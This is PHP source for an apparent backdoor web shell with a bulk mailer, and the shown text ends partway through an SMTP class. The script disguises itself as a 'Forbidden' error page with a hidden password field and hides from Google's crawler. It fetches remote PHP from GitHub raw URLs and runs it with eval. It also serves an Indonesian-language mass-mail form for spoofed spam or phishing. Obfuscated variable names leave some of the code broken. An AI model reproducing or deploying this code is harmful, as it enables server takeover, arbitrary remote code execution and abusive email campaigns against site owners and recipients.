<?php
$x0b = "27b92b681c4a1e255f66556a42ca6bef";
$x0c = "#00FF66";
$x0d = 'FilesMan';
@define('SELF_PATH', __FILE__);
if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
    header('HTTP/1.0 404 Not Found');
    exit;
}
@session_start();
@error_reporting(0);
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@set_time_limit(0);
@set_magic_quotes_runtime(0);
@define('VERSION', '2.2');
if( get_magic_quotes_gpc() ) {
    function stripslashes_array($x0e) {
        return is_array($x0e) ? array_map('stripslashes_array', $x0e) : stripslashes($x0e);
    }
    $_POST = stripslashes_array($_POST);
}
function printLogin() {
    ?>
<h1>Forbidden</h1>
<p>You don't have permission to acces on this server.</p>
<address>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</address>
    <style>
        input { margin:0;background-color:#fff;border:1px solid #fff; }
    </style>
    <div style='position: fixed; bottom: 0px; left: 0px; width: 0px;'>  
    <form method=post>
    <input type=password name=pass>
    </form></div>
    
<?php
    exit;
}
if( !isset( $_SESSION[md5($_SERVER['HTTP_HOST'])] ))
	if( empty( $x0b ) ||
		( isset( $_POST['pass'] ) && ( md5($_POST['pass']) == $x0b) ) )
		$_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
	else
		printLogin();
//Duwur Dewe //
if ( isset($_GET['SloROkaN']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/34971q6eydrieuoisl0r0k4N.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['XdRpLs']) )
{

$x0f = "https://raw.githubusercontent.com/antoniola/rejeki/master/873r872yieuhw987ipl00cup.php";
$x10 = file_get_contents($x0f);
eval('?>'.$x10);


}
if ( isset($_GET['M']) )
	{
	// HsH Mailer Extrime Card
	error_reporting(0);
	function query_str($x11){
	$x12 = ''; 
	foreach ($x11 as $x13 => $x14) {
	$x12 .= (strlen($x12) < 1) ? '' : '&';
	$x12 .= $x13 . '=' . rawurlencode($x14);
	}
	return ($x12);
	}
	function lrtrim($x15){
	return stripslashes(ltrim(rtrim($x15)));
	}
	if(isset($_POST['action'] ) ){

	$x16 = query_str($_POST);
	parse_str($x16);  
	$x17=lrtrim($x17);  
	$x18=lrtrim($x18);
	$x19=lrtrim($x19);
	$x1a=lrtrim($x1a);
	$x1b=lrtrim($x1b);
	$x1c=lrtrim($x1c);
	$x1d=lrtrim($x1d);
	$x1e=lrtrim($x1e);
	$x1f=lrtrim($x1f);
	$x20=lrtrim($x20);
	$x21=lrtrim($x21);
	$x22=lrtrim($x22);
	$x23=lrtrim($x24);
	$x25=lrtrim($x26);
	$x27=$x28['file']['name'];
	$x29=$x28['file']['tmp_name'];
	$x2a=lrtrim($x2a);
	$x2b=lrtrim($x2b);
	$x2c=$_POST['encode'];


			$x19 = urlencode($x19);
			$x19 = ereg_replace("%5C%22", "%22", $x19);
			$x19 = urldecode($x19);
			$x19 = stripslashes($x19);
			$x24 = stripslashes($x24);
			if ($x2c == "yes") {
			$x24 = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $x24);
			$x24 = str_replace(' ', '_', $x24);
			$x24 = "=?UTF-8?Q?$x24?=";
			$x26 = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $x26);
			$x26 = str_replace(' ', '_', $x26);
			$x26 = "=?UTF-8?Q?$x26?=";
			}
	}
	?>

	<html>

	<head>
	<link rel="SHORTCUT ICON" href="http://i48.servimg.com/u/f48/16/08/07/74/indone10.gif">
	<title> >-|I|-> Extrime |  Card <-|I|-< </title>

	<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

	<script src='http://static.tumblr.com/qo0gonz/JsJn0gihy/jquery-1.6.2.js'></script>
	 <style>
	body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
	A:link {text-decoration: none;color: aqua;}
	A:active {text-decoration: none;color: aqua;}
	A:visited {text-decoration: none;color: lime;}
	A:hover {text-decoration: underline; color: Fuchsia;}
	#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
	input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
	</style>
	<style type="text/css">
	<!--
	.style1 {
			font-family: Geneva, Arial, Helvetica, sans-serif;
			font-size: 12px;
	}
	body{
	margin:0px;
	}
	.bgup {
	background: url(data:image/gif;base64,R0lGODlhMgAqALMLABcXFyYmJjAwMB0dHSAgIBoaGhkZGRQUFCQkJBwcHAAAAP///wAAAAAAAAAAAAAAACH+A0c0NAAh/wtORVRTQ0FQRTIuMAMBAAAAIfkEBQoACwAsAAAAADIAKgAABP9QyUmrvTjbk44sSCElycR5CoKY3Re6onJK6mQot0LoUynduZQNJ9nteEfgZDVS+FZMZ09Kmz6FQmbJhyXmjNMfsSr+8pDlJQsFiiUCAMksJRjIW4o27I5CCDSAgYKDhIWBNSNcc3oyeHMkE4yPXF1UXkVnSpdNmEljlpVcW1VaVKOcWU2iFFGWmmCbmpawslx+dk5wfHuNKI+6eS+9IwGGxsfIyRiTS1GQuylRc4vCc7WsFFyyUZqvmWOnoK2rtlaqpOeb4tlDQdxj3p45v3F0uG/1c7fQ1DEcygADCswgCc+zYDEKojg4DQ8jWp+4wIIYRBu8MbCgpLOkMZWUVemATnWkGAaNyWtpNsFSSKweI5a58jly2GqgzZvGGOJBNKwnT2bQeLr69C7HtnYlj5YM58wUR3OomLJL2aUbUaSolMYMWoffzq498XHFSbasoIMw9UVJu1ManlnfjF7tlFIrSo+npKL7uLEpyJMX3U0gqa5oS14N+4BlqxjXP7PHIgAAIfkEBQoACwAsAQABADAAKAAABP8wJUURUivrvdRJXChuikRNlHJRhmKErguXo3imajqBXEn3v1rGR6ykWq8ecsYTakoBgLN3mFqv2Kx2y918DpQCokD5VlYKMdmTALPdltSXtBQaYXVSjiV77mA7KReAQU97Pk0deSN3Sn16aEgJUWVtYWOVcAIDl2tmbxWbXaOkpVcqaHMhYllncpYlKJGPTwQYWIK3erI6hUODuI27RnxJJLatwoYTCJtlpiTNnG/Q1dbXCxMiJpknKGljrS03TLrLKbYErd/aQO3DRgjiveXlFOlZsJNTHtj+/wBXheuhxtsrNwXmGbNyoxgec4QS8Svyp8c7G4smfsuoCCIVWAU9oQDodIIStYAoU17BBCpWipAftLRUg8+dxxgLh/h4OC7dBXk2I9azSORnzWE8h9KhFeLTpJHgPEl00i1qBAAh+QQFCgALACwBAAEAMAAoAAAE/7Cgsqq9OOudEVIEqCgGOSqJko3fSnCa8n1oPaarrGI6zIchU+m2u7CKFpBvyWw6n9CodErFHBKHW2okKWhP16zMd1yVhrXcVnhCwMq81BrHs9XWbg7ceD7RjXZ9e08KVxtdNwEAI2EsVY+QkU2NhVgsNJUxiCh/ZIKCOiNnLiJEoiR6ckR4figrM62rep8mR6cGpEGBJAkBMZSUCAIDjAmSx8jJVV1LCcZSQrlmta7Qcq9jcXadS6WjP0o8oM/K5ebn6BdrhiuUmx5Ib3a7uOKodS1MpvvX2uRJPfTNW/ONzz1A+ZR5qSTmnYB0ECNWKCbGWbwFMjBRskgozLiLgx8m0tNnQBWRHAkBzqlmBNadjyhBjnRiCYUiFsPMhYkAACH5BAUKAAsALAEAAQAwACgAAAT/MCW1ql0F3c2XUlonftOnlAqRcorRsiAlbqR5mgjITgmcz7SbCaUisFwGH3DJbDqf0Kh02vwcEodPpvBB/JhYEmqrRXAV14OLWmm5a5/iscVj31CoXOhyX9uRQyZyNEhpZWcIAmwdW4uOj5CRCgVVXjJObzcsRYE+JoBdQDUsep1BOTV5opo0nKOnn5l6UFmTj4mRubq7OyhpUDpUr3wqTF2XlaZ8s6tfmCrDFinIIzG8T3vX2tsbYWjehiDZ0uHhllZYfH7N1B6goDEfSHwTxtY0PKk4gT3S6zPH5rhwMzAewUQD0NUq5w0XC4a1EFrhRrGixYsYM+5KQQaEootmAiIAADs=);
	}


	.uibutton { 
		position: relative; 
		z-index: 1;
		overflow: visible; 
		display: inline-block; 
		padding: 0.3em 0.6em 0.375em; 
		border: 1px solid Lime; 
		border-bottom-color: Lime;
		
		margin: 0;
		text-decoration: none; 
		text-align: center;
		font: bold 11px/normal 'lucida grande', tahoma, verdana, arial, sans-serif; 
		white-space: nowrap; 
		cursor: pointer; 
		/* outline: none; */
		color: #f9f9f9; 
		background-color: #eee;
		background-image: -webkit-gradient(linear, 0 0, 0 100%, from(Lime), to(Lime));
		background-image: -moz-linear-gradient(Lime, Lime);
		background-image: -o-linear-gradient(Lime, Lime);
		background-image: linear-gradient(Lime, Lime);

		/* IE hacks */

		*display: inline; 

	}

	.uibutton:hover,
	.uibutton:focus,
	.uibutton:active {
		border-color: Lime Lime Lime Lime;
	}

	.uibutton:active {
		border-color: Lime;
		background: Lime;
		filter: none;
		-webkit-box-shadow: none;
		-moz-box-shadow: none;
		box-shadow: none;
	}

	/* overrides extra padding on button elements in Firefox */
	.uibutton::-moz-focus-inner {
		padding: 0;
		border: 0;
	}



	-->
	</style>
	<style type="text/css">
	<!--
	.style1 {
			font-size: 10px;
			font-family: Geneva, Arial, Helvetica, sans-serif;
			body,table{background:  ; font-family:Verdana,tahoma; color: Darkviolet ; font-size:10px }
	A:link {text-decoration: none;color: aqua;}
	A:active {text-decoration: none;color: aqua;}
	A:visited {text-decoration: none;color: lime;}
	A:hover {text-decoration: underline; color: Fuchsia;}
	#new,input,table,td,tr,#gg{border-style:solid;text-decoration:bold ;}
	input:hover,tr:hover,td:hover{background-color:  ; color: aqua;}
	}
	-->
	</style>
	</head>
	<body bgcolor="#f9f9f9" class="bgup">
	<div class="cadre" style="height:10px;margin:0px auto;"></div>
	<div style="width:80%;margin:0 auto;">
	<p align="center"><font size="5" face="Bauhaus 93"> >-|I|-> Extrime |  Card <-|I|-< </font></p>
	<form name="form1" method="post" action="" enctype="multipart/form-data">

	  <br>
	<center><table style="background:#" border="1"><tr>
	<th style="background:blink;"> 
	  <table width="100%" border="0" height="407" style="background:#fff" cellpadding="0" cellspacing="0">

		<tr>

		  <td width="100%" colspan="4"  style="color:#fff;background:Darkviolet" height="36">

			<b>

			<font face="Arial" size="2" >&nbsp;SMTP SETING</font></b></td>

		  </tr>
		<tr >

		  <td width="10%" height="22" style="padding:10px;">
	   
			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Login:</font></div>

		  </td>

		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="smtp_username" value="<?=$x20;?>" size="30">

			</font></td>

		  <td width="31%" height="22" style="padding:10px;">

			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">SMTP Pass:</font></div>

		  </td>

		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="password" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="smtp_password" value="<?=$x21;?>" size="30">

			</font></td>

		</tr>
		<tr>

		  <td width="10%" height="22" style="padding:10px;">

			<div align="right">
			  <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Port :</font></div>

		  </td>

		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="ssl_port" value="<?=$x1f;?>" size="5"> 
		  (optional)</font></td>

		  <td width="31%" height="22" style="padding:10px;">

			<div align="right">
			  <font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SMTP Server 
			  Smtp:</font></div>

		  </td>

		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="my_smtp" value="<?=$x1e;?>" size="30">

			</font></td>

		</tr>
		<tr>

		  <td width="10%" height="22" style="padding:10px;">

			<p align="right">
			<font face="Verdana, Arial, Helvetica, sans-serif" size="-3">SSL Server:</font></td>

		  <td width="18%" height="22" style="padding:10px;">
		  <input type="checkbox" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="sslclick" value="ON" <? if($x17){ print "checked"; } ?> ><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">(yes)</font></td>

		  <td width="31%" height="22" style="padding:10px;">

			<p align="right">
			<font face="Verdana, Arial, Helvetica, sans-serif" size="-3">Reconnect 
			After:</font></td>

		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;border: 1px solid Lime;color:#333" name="reconnect" value="<?=$x1c;?>" size="5"> 
		  EMAILS</font></td>

		</tr>
		<tr>

		  <td width="100%" height="39"  colspan="4" style="padding:10px;">

			<p align="center">
			<font face="Arial" style="font-size: 9pt" color="Darkviolet"><b> Jika Anda tidak memiliki SMTP login  Kosongkan pertanyaan di atas </b></font></td>

		  </tr>

		<tr>

		  <td width="10%" height="19" style="padding:10px;">

			&nbsp;</td>

		  <td width="18%" height="19" style="padding:10px;">&nbsp;</td>

		  <td width="31%" height="19" style="padding:10px;">

			&nbsp;</td>

		  <td width="41%" height="19" style="padding:10px;">&nbsp;</td>

		</tr>

		<tr>

		  <td width="100%" colspan="4" style="color:#fff;background:Darkviolet" height="36">

			<b>

			<font face="Arial" size="2" color="#FFFFFF">&nbsp;MESSAGE SETING</font></b></td>

		  </tr>
			  <tr>

		  <td width="10%" height="22" style="padding:10px;">
			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Attach File :</font></div>
		  </td>

		  <td width="59%" height="22" style="padding:10px;"  colSpan="3">
		  <font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

	<input type="file" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="file" size="124">

			</font></td>

		</tr>
		<tr>

		  <td width="10%" height="22" style="padding:10px;">

			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			  Email Anda:</font></div>

		  </td>

		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="from" value="<?=$x1b;?>" size="30">

			</font></td>

		  <td width="31%" height="22" style="padding:10px;">

			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			  Nama Anda:</font></div>

		  </td>

		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="realname" value="<?=$x25;?>" size="30">

			</font></td>

		</tr>
		<tr>

		  <td width="10%" height="22" style="padding:10px;">

			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Reply-To:</font></div>

		  </td>

		  <td width="18%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="replyto" value="<?=$x22;?>" size="30">

			</font></td>

		  <td width="31%" height="22" style="padding:10px;">

			<p align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">
			Prioritas Email :</font></td>

		  <td width="41%" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			&nbsp;</font><select style="background:#EFFBF8;;border: 1px solid Lime;color:#333" name="epriority" id="listMethod" onchange="showHideListConfig()">
			<option value="" <? if(strlen($x1d)< 1){print "selected";} ?> >- Pilihan -</option>
			<option value="1" <? if($x1d == "1"){print "selected";} ?> >Kenceng</option>
			<option value="3" <? if($x1d == "3"){print "selected";} ?> >Normal</option>
			<option value="5" <? if($x1d == "5"){print "selected";} ?> >Pelan</option>
			</select></td>

		</tr>

		<tr>

		  <td width="10%" height="22" style="padding:10px;">

			<div align="right"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">Subject:</font></div>

		  </td>

		  <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<input type="text" name="subject" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" value="<?=$x23;?>" size="90">

			</font></td>

		</tr>

		<tr>

		  <td width="10%" height="22" style="padding:10px;">

			&nbsp;</td>

		  <td colspan="3" height="22" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			&nbsp; <font color="Darkviolet">Encode Informasi Pengiriman ?</font> <select style="background:#EFFBF8;;border: 1px solid Lime;color:#333" size="1" name="encode">
			<option <? if($x2c == "yes"){print "selected";} ?>>ya</option>
			<option <? if($x2c == "no"){print "selected";} ?>>Tidak</option>
			</select></font></td>

		</tr>

		<tr valign="top">

	<td colspan="3" height="190" style="padding:10px;"><font size="-1" face="Verdana, Arial, Helvetica, sans-serif"> 

			<textarea name="message" cols="60" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" rows="10"><?=$x19;?></textarea>

			<br>

			<input type="radio" name="contenttype" value="plain" >

			Plain 

			<input type="radio" name="contenttype" value="html" checked>

			HTML 

			<input type="hidden" name="action" value="send">
			<input class="uibutton" type="submit" value="Send Message">

			</font></td>

		  <td width="41%" height="190" style="padding:10px;"><font size="-3" face="Verdana, Arial, Helvetica, sans-serif">

			<textarea name="emaillist" style="background:#EFFBF8;;border: 1px solid Lime;color:#333" cols="30" rows="10"><?=$x1a;?></textarea>

			</font></td>

		</tr>

	  </table>

	</form>
	</center>


	<?

	if ($x18){
			if (!$x1b && !$x24 && !$x19 && !$x1a){
			print "<script>alert('Please complete all fields before sending your message.'); </script>";
			die();	}

	class SMTP
	{
	  /**
	   *  SMTP server port
	   *  @var int
	   */
	  var $x2d = 25;

	  /**
	   *  SMTP reply line ending
	   *  @var string
	   */
	  var $x2e = "\r\n";

	  /**
	   *  Sets whether debugging is turned on
	   *  @var bool
	   */
	  var $x2f;       # the level of debug to perform

	  /**
	   *  Sets VERP use on/off (default is off)
	   *  @var bool
	   */
	  var $x30 = false;

	  /**#@+
	   * @access private
	   */
	  var $x31;      # the socket to the server
	  var $x32;          # error if any on the last call
	  var $x33;      # the reply the server sent to us for HELO
	  /**#@-*/

	  /**
	   * Initialize the class so that the data is in a known state.
	   * @access public
	   * @return void
	   */
	  function SMTP() {
		$this->smtp_conn = 0;
		$this->error = null;
		$this->helo_rply = null;

		$this->do_debug = 0;
	  }

	  /*************************************************************
	   *                    CONNECTION FUNCTIONS                  *
	   ***********************************************************/

	  /**
	   * Connect to the server specified on the port specified.
	   * If the port is not specified use the default SMTP_PORT.
	   * If tval is specified then a connection will try and be
	   * established with the server for that number of seconds.
	   * If tval is not specified the default is 30 seconds to
	   * try on the connection.
	   *
	   * SMTP CODE SUCCESS: 220
	   * SMTP CODE FAILURE: 421
	   * @access public
	   * @return bool
	   */
	  function Connect($x34,$x35=0,$x36=30) {
		# set the error val to null so there is no confusion
		$this->error = null;

		# make sure we are __not__ connected
		if($this->connected()) {
		  # ok we are connected! what should we do?
		  # for now we will just give an error saying we
		  # are already connected
		  $this->error = array("error" => "Already connected to a server");
		  return false;
		}

		if(empty($x35)) {
		  $x35 = $this->SMTP_PORT;
		}

		#connect to the smtp server
		$this->smtp_conn = fsockopen($x34,    # the host of the server
									 $x35,    # the port to use
									 $x37,   # error number if any
									 $x38,  # error message if any
									 $x36);   # give up after ? secs
		# verify we connected properly
		if(empty($this->smtp_conn)) {
		  $this->error = array("error" => "Failed to connect to server",
							   "errno" => $x37,
							   "errstr" => $x38);
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": $x38 ($x37)" . $this->CRLF;
		  }
		  return false;
		}

		# sometimes the SMTP server takes a little longer to respond
		# so we will give it a longer timeout for the first read
		// Windows still does not have support for this timeout function
		if(substr(PHP_OS, 0, 3) != "WIN")
		 socket_set_timeout($this->smtp_conn, $x36, 0);

		# get any announcement stuff
		$x39 = $this->get_lines();

		# set the timeout  of any socket functions at 1/10 of a second
		//if(function_exists("socket_set_timeout"))
		//   socket_set_timeout($this->smtp_conn, 0, 100000);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x39;
		}

		return true;
	  }

	  /**
	   * Performs SMTP authentication.  Must be run after running the
	   * Hello() method.  Returns true if successfully authenticated.
	   * @access public
	   * @return bool
	   */
	  function Authenticate($x3a, $x3b) {
		// Start authentication
		fputs($this->smtp_conn,"AUTH LOGIN" . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($x3d != 334) {
		  $this->error =
			array("error" => "AUTH not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		// Send encoded username
		fputs($this->smtp_conn, base64_encode($x3a) . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($x3d != 334) {
		  $this->error =
			array("error" => "Username not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		// Send encoded password
		fputs($this->smtp_conn, base64_encode($x3b) . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($x3d != 235) {
		  $this->error =
			array("error" => "Password not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		return true;
	  }

	  /**
	   * Returns true if connected to a server otherwise false
	   * @access private
	   * @return bool
	   */
	  function Connected() {
		if(!empty($this->smtp_conn)) {
		  $x3e = socket_get_status($this->smtp_conn);
		  if($x3e["eof"]) {
			# hmm this is an odd situation... the socket is
			# valid but we are not connected anymore
			if($this->do_debug >= 1) {
				echo "SMTP -> NOTICE:" . $this->CRLF .
					 "EOF caught while checking if connected";
			}
			$this->Close();
			return false;
		  }
		  return true; # everything looks good
		}
		return false;
	  }

	  /**
	   * Closes the socket and cleans up the state of the class.
	   * It is not considered good to use this function without
	   * first trying to use QUIT.
	   * @access public
	   * @return void
	   */
	  function Close() {
		$this->error = null; # so there is no confusion
		$this->helo_rply = null;
		if(!empty($this->smtp_conn)) {
		  # close the connection and cleanup
		  fclose($this->smtp_conn);
		  $this->smtp_conn = 0;
		}
	  }

	  /***************************************************************
	   *                        SMTP COMMANDS                       *
	   *************************************************************/

	  /**
	   * Issues a data command and sends the msg_data to the server
	   * finializing the mail transaction. $x3f is the message
	   * that is to be send with the headers. Each header needs to be
	   * on a single line followed by a <CRLF> with the message headers
	   * and the message body being seperated by and additional <CRLF>.
	   *
	   * Implements rfc 821: DATA <CRLF>
	   *
	   * SMTP CODE INTERMEDIATE: 354
	   *     [data]
	   *     <CRLF>.<CRLF>
	   *     SMTP CODE SUCCESS: 250
	   *     SMTP CODE FAILURE: 552,554,451,452
	   * SMTP CODE FAILURE: 451,554
	   * SMTP CODE ERROR  : 500,501,503,421
	   * @access public
	   * @return bool
	   */
	  function Data($x3f) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				  "error" => "Called Data() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"DATA" . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 354) {
		  $this->error =
			array("error" => "DATA command not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		# the server is ready to accept data!
		# according to rfc 821 we should not send more than 1000
		# including the CRLF
		# characters on a single line so we will break the data up
		# into lines by \r and/or \n then if needed we will break
		# each of those into smaller lines to fit within the limit.
		# in addition we will be looking for lines that start with
		# a period '.' and append and additional period '.' to that
		# line. NOTE: this does not count towards are limit.

		# normalize the line breaks so we know the explode works
		$x3f = str_replace("\r\n","\n",$x3f);
		$x3f = str_replace("\r","\n",$x3f);
		$x40 = explode("\n",$x3f);

		# we need to find a good way to determine is headers are
		# in the msg_data or if it is a straight msg body
		# currently I am assuming rfc 822 definitions of msg headers
		# and if the first field of the first line (':' sperated)
		# does not contain a space then it _should_ be a header
		# and we can process all lines before a blank "" line as
		# headers.
		$x41 = substr($x40[0],0,strpos($x40[0],":"));
		$x42 = false;
		if(!empty($x41) && !strstr($x41," ")) {
		  $x42 = true;
		}

		$x43 = 998; # used below; set here for ease in change

		while(list(,$x44) = @each($x40)) {
		  $x45 = null;
		  if($x44 == "" && $x42) {
			$x42 = false;
		  }
		  # ok we need to break this line up into several
		  # smaller lines
		  while(strlen($x44) > $x43) {
			$x46 = strrpos(substr($x44,0,$x43)," ");

			# Patch to fix DOS attack
			if(!$x46) {
			  $x46 = $x43 - 1;
			}

			$x45[] = substr($x44,0,$x46);
			$x44 = substr($x44,$x46 + 1);
			# if we are processing headers we need to
			# add a LWSP-char to the front of the new line
			# rfc 822 on long msg headers
			if($x42) {
			  $x44 = "\t" . $x44;
			}
		  }
		  $x45[] = $x44;

		  # now send the lines to the server
		  while(list(,$x47) = @each($x45)) {
			if(strlen($x47) > 0)
			{
			  if(substr($x47, 0, 1) == ".") {
				$x47 = "." . $x47;
			  }
			}
			fputs($this->smtp_conn,$x47 . $this->CRLF);
		  }
		}

		# ok all the message data has been sent so lets get this
		# over with aleady
		fputs($this->smtp_conn, $this->CRLF . "." . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "DATA not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}
		return true;
	  }

	  /**
	   * Expand takes the name and asks the server to list all the
	   * people who are members of the _list_. Expand will return
	   * back and array of the result or false if an error occurs.
	   * Each value in the array returned has the format of:
	   *     [ <full-name> <sp> ] <path>
	   * The definition of <path> is defined in rfc 821
	   *
	   * Implements rfc 821: EXPN <SP> <string> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE FAILURE: 550
	   * SMTP CODE ERROR  : 500,501,502,504,421
	   * @access public
	   * @return string array
	   */
	  function Expand($x48) {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				"error" => "Called Expand() without being connected");
		  return false;
		}

		fputs($this->smtp_conn,"EXPN " . $x48 . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER:" . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => "EXPN not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		# parse the reply and place in our array to return to user
		$x49 = explode($this->CRLF,$x3c);
		while(list(,$x4a) = @each($x49)) {
		  $x4b[] = substr($x4a,4);
		}

		return $x4b;
	  }

	  /**
	   * Sends the HELO command to the smtp server.
	   * This makes sure that we and the server are in
	   * the same known state.
	   *
	   * Implements from rfc 821: HELO <SP> <domain> <CRLF>
	   *
	   * SMTP CODE SUCCESS: 250
	   * SMTP CODE ERROR  : 500, 501, 504, 421
	   * @access public
	   * @return bool
	   */
	  function Hello($x34="") {
		$this->error = null; # so no confusion is caused

		if(!$this->connected()) {
		  $this->error = array(
				"error" => "Called Hello() without being connected");
		  return false;
		}

		# if a hostname for the HELO was not specified determine
		# a suitable one to send
		if(empty($x34)) {
		  # we need to determine some sort of appopiate default
		  # to send to the server
		  $x34 = "localhost";
		}

		// Send extended hello first (RFC 2821)
		if(!$this->SendHello("EHLO", $x34))
		{
		  if(!$this->SendHello("HELO", $x34))
			  return false;
		}

		return true;
	  }

	  /**
	   * Sends a HELO/EHLO command.
	   * @access private
	   * @return bool
	   */
	  function SendHello($x4c, $x34) {
		fputs($this->smtp_conn, $x4c . " " . $x34 . $this->CRLF);

		$x3c = $this->get_lines();
		$x3d = substr($x3c,0,3);

		if($this->do_debug >= 2) {
		  echo "SMTP -> FROM SERVER: " . $this->CRLF . $x3c;
		}

		if($x3d != 250) {
		  $this->error =
			array("error" => $x4c . " not accepted from server",
				  "smtp_code" => $x3d,
				  "smtp_msg" => substr($x3c,4));
		  if($this->do_debug >= 1) {
			echo "SMTP -> ERROR: " . $this->error["error"] .
					 ": " . $x3c . $this->CRLF;
		  }
		  return false;
		}

		$this->helo_rply = $x3c;

		return true;
	  }

	  /**
	   * Gets help information on the keyword specified. If the keyword
	   * is not specified then returns generic help, ussually contianing
	   * A list of keywords that help is available on. This function
	   * returns the results back to the user. It is up to the user to
	   * handle the returned data. If an error occurs then false is
	   * returned with $this->error set appropiately.
	   *
	   * Implements rfc 821: HELP [ <SP> <string> ] <CRLF>
	   *
	   * SMTP CODE SUCCESS: 211,214
